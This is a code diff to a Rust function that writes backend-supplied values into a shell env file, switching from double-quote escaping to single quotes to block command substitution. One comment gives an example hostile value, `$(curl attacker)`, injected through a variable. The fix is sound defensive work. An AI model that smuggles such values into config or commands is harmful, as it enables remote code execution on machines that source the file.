@@ -294,10 +294,14 @@ fn write_env_file(path: &std::path::Path, r: &RegisterResponse) -> Result<(), Se
     let mut content = String::new();
     for (k, v) in pairs {
         validate_env_value(k, v)?;
-        // Escape backslash + double-quote so shell-source doesn't end the
-        // quoted value early on a stray quote.
-        let escaped = v.replace('\\', "\\\\").replace('"', "\\\"");
-        content.push_str(&format!("{k}=\"{escaped}\"\n"));
+        // SECURITY: single-quote values. Bash single-quoted strings do NOT
+        // perform $-expansion or command substitution, so a malicious or
+        // compromised backend returning e.g. `TURN_SECRET=$(curl attacker)`
+        // is rendered literally at `source` time instead of being executed.
+        // Embedded single quotes are escaped via the canonical `'\''` trick
+        // (close-quote, escaped quote, reopen).
+        let escaped = v.replace('\'', "'\\''");
+        content.push_str(&format!("{k}='{escaped}'\n"));
     }
 
     let dir = path.parent().unwrap_or_else(|| std::path::Path::new("."));
